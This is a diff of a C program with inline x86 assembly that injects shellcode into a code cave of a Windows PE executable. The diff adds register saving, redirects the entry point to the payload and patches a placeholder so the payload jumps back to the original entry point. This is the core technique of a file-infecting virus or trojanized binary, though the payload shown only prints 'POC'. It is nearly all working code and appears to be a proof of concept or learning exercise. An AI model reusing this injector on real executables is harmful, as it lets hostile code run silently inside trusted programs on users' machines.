@@ -10,6 +10,8 @@
 __declspec(naked) Payload(VOID) {
 	__asm {
 
+		pushad
+			
 		// GetStdHandle
 		push	-11			// arg1 = -11 = stdout
 		mov	eax, 0xAAAAAAAA		// placeholder for GetStdHandle address
@@ -19,10 +21,8 @@ __declspec(naked) Payload(VOID) {
 		push 	0x000a
 		push 	'COP'
 		mov 	ecx, esp		
-
 		push	ebx
 		mov	ebx, esp
-
 		push	0			// arg5 = 0
 		push	ebx			// arg4 = ptr to var (num chars written)
 		push	5			// arg3 = len of string
@@ -30,6 +30,11 @@ __declspec(naked) Payload(VOID) {
 		push	eax			// arg1 = handle to stdout
 		mov	eax, 0xBBBBBBBB		// placeholder for WriteConsoleA address
 		call	eax
+			
+		popad
+
+		push	0xCCCCCCCC		// placeholder for OEP
+		ret
 
 	}
 } 
@@ -126,7 +131,6 @@ int main(int argc, char* argv[]) {
 			break;
 			pish += 1;
 		}
-
 	}
 
 	/***********************************************
@@ -177,15 +181,27 @@ int main(int argc, char* argv[]) {
 	|	(a) set entry point to payload	       |
 	***********************************************/
 	
+	/** get original entry point (OEP) **/
+	DWORD dwOEP = pinh->OptionalHeader.AddressOfEntryPoint + pinh->OptionalHeader.ImageBase;
+	
 	pinh->OptionalHeader.AddressOfEntryPoint = dwCodecaveOffset + pish->VirtualAddress - pish->PointerToRawData;
 	
 	/***********************************************
-	|	(b) augment section size	       |
+	|	(b) set payload to orig. entry point   |
+	***********************************************/
+	
+	for (i = 0; i < dwShellcodeSize; i++) {
+		if (*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) == 0xCCCCCCCC) {
+			*(LPDWORD)((int)lpTarget + dwCodecaveOffset + i) = (DWORD)dwOEP;
+			break;
+		}
+	}
+	
+	/***********************************************
+	|	(c) augment section size	       |
 	***********************************************/
 
-
 	pish->Misc.VirtualSize += dwShellcodeSize;
-
 
 	/***********************************************
 	|	(d) set payload function addresses     |
